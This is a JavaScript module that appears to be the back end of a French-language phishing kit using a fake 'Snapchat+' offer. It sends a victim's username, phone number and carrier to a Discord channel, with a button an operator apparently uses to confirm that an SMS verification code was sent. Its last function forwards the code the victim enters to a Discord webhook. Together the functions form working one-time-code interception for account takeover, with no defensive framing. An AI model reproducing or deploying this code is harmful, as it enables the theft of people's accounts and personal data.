export async function sendApprovalRequest({ sessionId, username, phone, carrier }) {
  const botToken = process.env.DISCORD_BOT_TOKEN;
  const channelId = process.env.DISCORD_CHANNEL_ID;

  if (!botToken || !channelId) {
    throw new Error("Discord bot not configured");
  }

  const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
    method: "POST",
    headers: {
      Authorization: `Bot ${botToken}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      embeds: [
        {
          title: "📱 Nouvelle demande Snapchat+",
          color: 16776960,
          fields: [
            { name: "Pseudo", value: username, inline: true },
            { name: "Téléphone", value: phone, inline: true },
            { name: "Opérateur", value: carrier, inline: true },
          ],
          footer: { text: "Cliquez pour confirmer l'envoi du code SMS" },
          timestamp: new Date().toISOString(),
        },
      ],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 3,
              label: "Code envoyé",
              custom_id: `approve:${sessionId}`,
            },
          ],
        },
      ],
    }),
  });

  if (!response.ok) {
    throw new Error("Discord message failed");
  }

  return response.json();
}

export async function disableApprovalButton(messageId, channelId) {
  const botToken = process.env.DISCORD_BOT_TOKEN;

  if (!botToken || !messageId || !channelId) return;

  await fetch(`https://discord.com/api/v10/channels/${channelId}/messages/${messageId}`, {
    method: "PATCH",
    headers: {
      Authorization: `Bot ${botToken}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 3,
              label: "✓ Code envoyé",
              custom_id: "approved",
              disabled: true,
            },
          ],
        },
      ],
    }),
  });
}

export async function sendWebhookEmbed(type, data) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (!webhookUrl) {
    throw new Error("Webhook not configured");
  }

  const embed =
    type === "verify"
      ? {
          title: "🔐 Code de vérification",
          color: 5763719,
          fields: [
            { name: "Pseudo", value: data.username, inline: true },
            { name: "Téléphone", value: data.phone, inline: true },
            { name: "Code", value: data.code, inline: true },
            { name: "Opérateur", value: data.carrier, inline: true },
          ],
        }
      : null;

  if (!embed) throw new Error("Invalid webhook type");

  const response = await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{ ...embed, timestamp: new Date().toISOString() }],
    }),
  });

  if (!response.ok) {
    throw new Error("Discord webhook failed");
  }
}
